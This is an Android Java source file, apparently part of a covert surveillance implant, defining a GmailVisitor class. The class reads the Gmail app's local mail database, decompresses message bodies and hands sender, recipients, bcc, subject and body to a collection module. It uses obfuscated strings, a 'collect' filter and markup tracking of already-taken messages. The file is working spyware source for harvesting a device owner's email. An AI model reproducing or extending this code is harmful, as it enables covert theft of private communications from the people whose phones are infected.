package com.android.dvci.module.email;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.zip.InflaterInputStream;

import android.database.Cursor;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.module.ModuleMessage;
import com.android.dvci.module.message.Filter;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

public class GmailVisitor extends RecordVisitor {
	private static final String TAG = "GmailVisitor";
	boolean initialized = false;
	private ModuleMessage moduleMessage;
	private String mailstore;
	public String[] projection = StringUtils
			.split(M.e("_id,fromAddress,toAddresses,ccAddresses,bccAddresses,bodyCompressed,dateSentMs,subject,snippet,bodyEmbedsExternalResources,joinedAttachmentInfos"));

	public String selection = M.e("_id > ");
	public int lastId;
	private String from;
	private boolean requestStop;
	private Filter filter;
	private boolean stopRequest;

	public GmailVisitor(ModuleMessage moduleMessage, String mailstore, Filter filterCollect) {
		this.moduleMessage = moduleMessage;
		this.from = mailstore.substring(M.e("mailstore.").length(), mailstore.length() - M.e(".db").length());
		this.mailstore = mailstore;
		this.filter = filterCollect;
	}

	public static String decompress(byte[] compressed) throws IOException {
		// byte[] compressed = StringUtils.hexStringToByteArray(zipText);

		InflaterInputStream gzipInputStream = new InflaterInputStream(new ByteArrayInputStream(compressed, 0,
				compressed.length));

		ByteArrayOutputStream baos = new ByteArrayOutputStream();

		byte b[] = new byte[1024];
		while (true) {
			int l = gzipInputStream.read(b, 0, 1024);
			if (l == -1) {
				break;
			}
			baos.write(b, 0, l);
		}

		gzipInputStream.close();
		baos.close();
		String sReturn = new String(baos.toByteArray(), "UTF-8");
		return sReturn;

	}

	@Override
	public long cursor(Cursor cursor) {
		initialize(cursor);
		// extract messages

		int id = cursor.getInt(0);
		String fromAddress = cursor.getString(1);
		String toAddresses = cursor.getString(2);
		String ccAddresses = cursor.getString(3);
		String bccAddresses = cursor.getString(4);
		byte[] bodyCompressed = cursor.getBlob(5);
		Date timestamp = new Date(cursor.getLong(6));
		String subject = cursor.getString(7);
		String snippet = cursor.getString(8);

		String body = snippet;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (cursor), _id=" + id + " date= " + timestamp + " from=" + fromAddress + " to= "
					+ toAddresses);
		}

		try {
			if (bodyCompressed != null) {
				body = decompress(bodyCompressed);
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (cursor) Error: " + e);
			}
		}

		boolean incoming = !fromAddress.contains(from);
		Email m = new Email(incoming, timestamp, fromAddress, toAddresses, ccAddresses, body, snippet, subject);
		moduleMessage.saveEmail(m);
		moduleMessage.updateMarkupMail(mailstore, id, false);

		if (Cfg.ONE_MAIL) {
			stopRequest = true;
		}
		return id;
	}

	private void initialize(Cursor cursor) {
		if (initialized)
			return;

		initialized = true;
	}

	@Override
	public String[] getProjection() {
		return projection;
	}

	@Override
	public String getSelection() {
		String where = selection + lastId;
		if (filter.doFilterFromDate) {
			where += M.e(" and dateSentMs > ") + filter.fromDate.getTime();
		}
		return where;
	}

	@Override
	public boolean isStopRequested() {
		return moduleMessage.isStopRequested() || stopRequest;
	}

}
